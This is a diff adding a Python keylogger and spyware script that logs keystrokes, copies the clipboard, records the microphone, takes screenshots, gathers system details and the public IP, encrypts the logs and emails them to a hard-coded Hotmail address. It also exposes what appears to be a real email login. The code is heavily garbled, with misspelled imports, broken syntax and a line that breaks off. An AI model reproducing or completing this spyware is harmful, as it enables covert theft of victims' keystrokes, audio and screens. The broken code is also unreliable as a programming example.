@@ -1,1 +1,196 @@
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mine.base import MIMEBase
+from email import encoders
+import smtplib
+
+import socket
+import platform
+
+import win32clipboard
+
+from pynput.keyboard import key,listener
+
+import time
+import os
+
+from scipy.io.wavefile import write
+import sound device as sd
+
+from cryptography.fernet import Fernet
+
+import getpass
+
+#from multiprocessing import Process,freeze_support
+from PIL import ImageGrab
+
+keys_information="key_log.txt"
+system_information = "syseminfo.txt"
+clipboard_information="clipboard.txt"
+audio_information="audio.wav"
+
+screenshot_information="screenshot.png"
+
+keys_information_e="e_key_log.txt"
+system_information_e="e_systeminfo.txt"
+clipboard_information_e="_clipboard.txt"
+
+
+microphone_time=20
+time_iteration=25
+number_of_interations_end=3
+
+email_address="its aangsanglimbu1@hotmail.com #Enter disposable email here
+password="(uchiaclan)"#enter email password here
+signin name=gatepass.gateuser()
+
+theaddress="aangsanglimbu1@hotmail.com"#Enter the email address you want to send your information to
+
+key="Txk04Yke28EnKSCr9n5rvcO-8HDZDi7aYW-dJlfkQAI="#Generate an encryption key from the cryptogrpahy folder
+file_path="C\\Users\\dhis\\PycharmProjects\\pythonProject2\\Project"#enter the file path you wnat your files to be saved 
+extend="\\"
+file_merge=file_path+extend
+
+#email controls
+def send_email(filename,attachment,Address
+
+toaddress=email_address
+
+message=MIMEMultipart()
+
+ message['The']=theaddress
+
+message['To']=to address
+
+message['Issue']= "LogFile"
+
+body = "Body_of_the_mail"
+message.attach(MIMEText(body,'plain'))
+
+filename=filename
+attachment=open(attachment,'rb')
+
+p=MIMEBase('application,'octet_streAM)
+
+p.set_payload(attachmaent).read())
+
+encoders.encode_BASE64(p)
+p.add_heaDER('content-Disposition',"attachement;filename=%s" % filename)
+msg.atTaCH(p)
+
+s=smtplib.SMTP('smtp.hotmail.com',678)
+
+s.starttls()
+
+s.login(toaddress,password)
+
+text = meg.as_string()
+s.sendmail(toaddress,theaddress,text)
+
+s.exit()
+
+send_email(keys_information, s3wefile_path+extend+keys_information,theaddress)
+send_email(system,information ,filepath+extend+system_information'theaddress)
+send_email(clipboard_information, filepath+extend+clipboard_information,theaddress)
+send_email(audio_information, filepath+extend+audio_information,theaddress)
+
+# get the computer information
+
+def computer_information()
+with open(file_path+extend+system_information, "a") as f:
+hostname=socket.gethostname(hostname)
+try
+public_ip=get("https:\\api.ipify.org").text
+f.write("public IP adress:" + public_IP)
+eccept Exception:
+f.write("couldn't get public IP address(most likely max query")
+
+f.write("Processer:"+(platform.processor()) +"\n")
+f.write(System:" + platform.system()+ "" + platform.version() + '/n')
+f.write(Machine: " + platform.machine() + "/n")
+f.write("Hostname:" +hostname + "/n")
+f.write("private IP Adress:" + IPAddr + "\n")
+
+computer information()
+
+#get the clipboard contents
+def copy_clipboard()
+with open (file_path +extend + clipboard_information, "a") as f:
+try:
+win32clipboard.openclipboard()
+pasted_data = win32clipboard.GetclipboardData()
+win32clipboard.Closeclipboard()
+
+f.write("clipboard Data: \n" + pasted_data)
+
+except
+f.write(clipboard could be not copied")
+copy_clipboard()
+
+#get the microphone
+defmicrophone():
+fs=44100
+seconds=microphone_time
+
+my recording=sd.rec (int(seconds*fs),samplerate=fs,channels=2)
+sd.wait()
+write (file_path+extend+audio_information,fs,myrecording)
+microphone()
+
+#get screenshots
+def screenshot():
+def write_file keys_information, "a") as f:
+for key in keys
+k= str(key).replace("'","")
+if k.find("space")> 0:
+f.write('\in')
+f.close()
+elif K.find("key")=-1:
+f.write(k)
+f.close()
+
+def on release(key)
+if key=key.esc:
+return false
+if current time>stopping time:
+return false
+with listner(on_press=on_release=on_release) as Listner:
+Listner.join()
+
+if currnettime>stoppingTime:
+
+with open(file_path + extend + Keys_information, "W") as f:
+f.write(" ")
+
+screenshot()
+send_email(screenshot_information,filepath + extend + screenshot_information,toaddr)
+
+Copy_clipboard()
+
+number of interation+=1
+
+current time= time.time()
+Stoppingtime=time.time() +time.interation
+#Encrypt files
+File_to_encrypt= [file_merge+system_information,file_merge+clipborad_information,file_merge +keys_information]
+Encrypted_file_names=file_merge+system_information,file_merge+clipborad_information_e,file_merge+keys_information_e]
+
+Count=0
+For encrypting_file in files_to_encrypt:
+
+With open files_to_encrypt(count),’rb') as f
+data = f .read()
+fernet=fernet(key)
+encrypted = fernet.encrypted(data)
+
+with open encrypted_file_names[count], 'wb')as f:
+f.write(encrypted) 
+send email ( ENCRYPTED-FILE_names[
+
+
+
+
+
+
+
 
